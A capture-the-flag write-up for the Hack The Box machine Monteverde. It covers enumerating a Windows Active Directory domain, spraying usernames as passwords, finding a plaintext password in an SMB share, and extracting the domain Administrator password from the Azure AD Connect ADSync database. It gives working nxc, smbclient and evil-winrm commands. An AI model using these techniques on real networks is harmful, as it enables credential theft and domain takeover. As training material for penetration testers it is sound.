#Windows #ActiveDirectory #SMB #passwordspraying #credentialhunting #AzureADConnect #ADSync #WinRM #PrivEsc

## Overview

Monteverde is a medium Windows Active Directory box in a MEGABANK domain running Azure AD Connect. The entry point is a self-credentialing service account: `SABatchJobs` uses its own username as its password, discovered by spraying the domain user list against itself. That account reads a writable SMB share where another user's home directory contains an Azure PowerShell XML config file with a plaintext password. `mhope`'s Azure Admin group membership enables a published Azure AD Connect credential extraction attack that decrypts the domain Administrator's password from the local ADSync SQL database.

## Recon

Nmap showed a domain controller layout: LDAP, Kerberos, SMB, but no web service. RPC or LDAP enumeration would be the path to a user list since the box offers no HTTP attack surface.

Domain info extracted via unauthenticated enumeration:

```
NetBIOS domain:  MEGABANK
DNS domain:      MEGABANK.LOCAL
FQDN:            MONTEVERDE.MEGABANK.LOCAL
```

User accounts recovered from the domain:

```
AAD_987d7f2f57d2   mhope         SABatchJobs
svc-ata            svc-bexec     svc-netapp
dgalanos           roleary       smorgan
```

Notable local groups included `ADSyncAdmins`, `ADSyncOperators`, and `ADSyncPasswordSet`, hinting strongly at Azure AD Connect.

## Foothold

### Username-as-Password Spray → SABatchJobs

With no other credentials, spraying the user list against itself (each account's own username as the password) is a low-noise tactic for finding accounts provisioned with default credentials:

```sh
nxc smb 10.129.170.14 -u users.txt -p users.txt --continue-on-success
SMB [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

> **Why service accounts use their own username as a password:** batch job accounts are often provisioned by automating account creation scripts that set `username == password` as a placeholder, expecting an admin to rotate it. They frequently don't get rotated because the account "works" and no one notices.

### SMB Share Enumeration → azure.xml

Enumerating share access as `SABatchJobs`:

```sh
smbmap -H 10.129.170.14 -u SABatchJobs -p SABatchJobs
# user$: READ ONLY
# azure_uploads: READ ONLY
```

Connecting to `user$` and browsing home directories:

```sh
smbclient //MEGABANK.LOCAL/users$ -U 'SABatchJobs'
# mhope\azure.xml  (others were empty)
mget azure.xml
```

File contents:

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
    </TN>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00...</DT>
      <DT N="EndDate">2054-01-03T05:35:00...</DT>
      <S N="Password">‹redacted›</S>
    </Props>
  </Obj>
</Objs>
```

> **PSADPasswordCredential XML files:** Azure PowerShell cmdlets produce serialized credential objects in this format when exporting AD application passwords. The `<S N="Password">` field is plaintext, this is not encryption, it is serialization. Leaving these files in a world-readable SMB share is equivalent to leaving a sticky note with the password.

Credentials: `mhope:‹redacted›`

### WinRM Shell as mhope

```sh
evil-winrm -i 10.129.170.14 -u mhope -p '‹redacted›'
*Evil-WinRM* PS C:\Users\mhope\desktop> type user.txt
‹redacted›
```

## Privilege Escalation

### Azure AD Connect Credential Extraction → Administrator

`mhope` is a member of the **Azure Admins** group and the machine runs Azure AD Connect with the ADSync service. Azure AD Connect stores the synchronized account's credentials (an account with DCSync rights) encrypted in a local SQL database (`ADSync`). Members of the Azure Admin group can query this database.

> **The Azure AD Connect attack:** the ADSync database stores credentials for the account Azure AD Connect uses to sync passwords. Those credentials are AES-encrypted with keys stored in the Windows DPAPI vault tied to the service account. An admin on the machine (or in the Azure Admins group) can re-create the decryption by connecting to the local ADSync SQL instance via integrated auth, reading the encrypted blob, and applying the same decryption logic the service uses. The result is the plaintext credential for an account that has DCSync (domain admin equivalent) privileges.

Using the published PoC from xpn's blog (modified to use integrated auth against the local SQL instance):

```powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
```

Uploading and running the script:

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> .\creds.ps1
Domain:   MEGABANK.LOCAL
Username: administrator
Password: ‹redacted›
```

## Root

```powershell
evil-winrm -i 10.129.170.14 -u administrator -p '‹redacted›'
*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
‹redacted›
```

## Takeaways

- **Always spray usernames as passwords.** Service accounts provisioned with placeholder credentials are a consistent finding, and the spray is fast and quiet.
- **SMB home-directory shares frequently contain sensitive files.** `azure.xml`, `web.config`, and similar files left in user shares are a reliable lateral movement source.
- **Azure AD Connect creates a high-value credential target.** The ADSync account has DCSync rights; any admin who can reach the local SQL instance and knows the PoC can recover those credentials.
- **Group membership in `Azure Admins` or `ADSyncAdmins` is functionally domain admin.** Treat these groups with the same weight as `Domain Admins` when reviewing AD.
